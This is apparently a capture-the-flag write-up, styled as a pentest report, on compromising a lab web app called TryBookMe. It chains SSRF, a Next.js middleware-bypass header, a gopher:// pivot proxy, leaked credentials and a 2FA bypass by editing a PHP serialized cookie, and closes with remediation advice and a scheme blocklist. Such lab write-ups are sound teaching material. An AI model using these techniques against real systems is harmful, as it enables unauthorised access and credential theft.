1. Summary

During the assessment of the TryBookMe machine, I identified a critical chain of vulnerabilities that allowed full compromise of internal services, extraction of sensitive credentials, bypassing 2FA protections, and achieving full administrative control.

The compromise was achieved through:

SSRF in preview.php

Internal service enumeration

Next.js Middleware Authorization Bypass

Gopher tunneling proxy for pivoting

Exposed /customapi endpoint leaking credentials

Manipulation of serialized AuthToken cookie → 2FA bypass

This chain leads to complete compromise of the management system.

2. Enumeration

I began with a fast port scan using Rustscan:

rustscan -a 10.10.XX.XX


Results:

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http


Then a detailed Nmap scan:

nmap -sT -A -p 22,80 10.10.XX.XX


Results:

SSH: OpenSSH 9.6p1 Ubuntu

HTTP: Apache 2.4.58 serving TryBookMe – Online Library

3. Web Enumeration

Visiting the web application showed two downloadable PDFs.
Requests were handled via:

GET /preview.php?url=http://extract.thm/pdf/dummy.pdf


This instantly suggested a possible SSRF vulnerability.

4. Confirming SSRF

I launched a simple web server:

python3 -m http.server 8000


And accessed:

http://extract.thm/preview.php?url=http://MY_IP:8000/


My server received the request → SSRF confirmed.

5. Internal Service Discovery via SSRF

Testing URLs:

http://extract.thm/preview.php?url=http://127.0.0.1/


Revealed an internal page:

/management


which was not accessible externally.

Using Caido fuzzing and SSRF:

Discovered port 10000

Hosting another service /customapi

6. Next.js Middleware Authorization Bypass

Port 10000 returned “Not Authorized”.

Based on known Next.js vulnerabilities, adding:

x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware


bypasses authorization.

But I couldn’t reach port 10000 → needed to pivot.

7. Building a Gopher‑based SSRF Proxy

I wrote a custom proxy:

Listens locally (127.0.0.1:4002)

Encodes requests twice

Sends them to the SSRF endpoint using gopher://

Allows local requests to reach internal services

Proxy Script

(You already pasted the code — kept unchanged for report.)

Usage
python3 proxy.py --lhost 127.0.0.1 --lport 4002 \
--target extract.thm --phost 127.0.0.1 --pport 10000


Visiting:

http://127.0.0.1:4002/customapi


→ Successfully retrieved the internal API response.

8. Critical Leak – /customapi Endpoint

The internal API returned:

Internal Flag

Management Portal Credentials (Username + Password)

This endpoint was fully exposed internally without:

Authentication

Authorization

Rate limiting

Sanitization

This was the direct cause of the management compromise.

9. Logging into the Management Portal

Using the leaked credentials, I accessed:

http://127.0.0.1:4002/management


Portal required 2FA, but reviewing Caido logs revealed a cookie:

auth=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D


Decoded:

O:9:"AuthToken":1:{s:9:"validated";b:0;}


I modified:

b:0 → b:1


Re‑encoded it, set it as cookie → bypassed 2FA.

Admin access granted.

Extracted the final admin flag.

10. Attack Chain Summary
Step	Description
1	Enumerated HTTP services
2	Found SSRF in preview.php
3	Enumerated internal services: /management & port 10000
4	Identified Next.js middleware bypass
5	Created Gopher proxy to pivot into internal network
6	/customapi exposed credentials & internal flag
7	Logged into management portal
8	Modified AuthToken cookie → 2FA bypass
9	Full admin compromise

This is a complete system compromise.

11. Root Cause Analysis
Primary Vulnerabilities

SSRF in preview.php

Internal services exposed without authentication

Next.js middleware authorization bypass

Credential leak via /customapi

Weak PHP serialized object validation (2FA bypass)

Key Failure Points

No input validation

No URL allowlist or denylist

No authentication on internal APIs

Sensitive data exposure in responses

Accepting unsafely serialized objects

12. Recommendations (as a Developer)
1. Implement URL Allowlists

Only allow internal requests to:

Whitelisted domains

Strict patterns

Reject private IPs (0.0.0.0/8, 10.0.0.0/8, localhost)

2. Maintain SSRF Blocklist

Immediately block:

gopher://

ftp://

file://

dict://

mailto://

3. Harden Authentication

Sign serialized tokens

Use JWT instead of PHP serialized objects

Validate 2FA server‑side, not client‑side

4. Protect Internal Endpoints

/customapi MUST require:

Strong authentication

Separate internal token

No sensitive plaintext output

5. Never return passwords

Store passwords using:

bcrypt/argon2id

Zero plaintext passwords ever

6. Disable unnecessary internal ports

Port 10000 should not be exposed except via backend channels.

7. Implement Logging & Alerts

Any attempt to fetch gopher:// should trigger:

Alert

Account lock

Logging

8. Fix Next.js Middleware Configuration

Ensure:

matcher: ['/((?!api).*)']


is correctly set.

9. Validate serialized objects

Reject tampering by:

Signing tokens

Using encryption keys

Validating integrity hashes

13. Final Impact

Complete compromise of internal APIs

Full admin login bypass

Credential leakage

Sensitive data exposure

Total system compromise

This chain shows how a single SSRF vulnerability can escalate into a full infrastructure breach.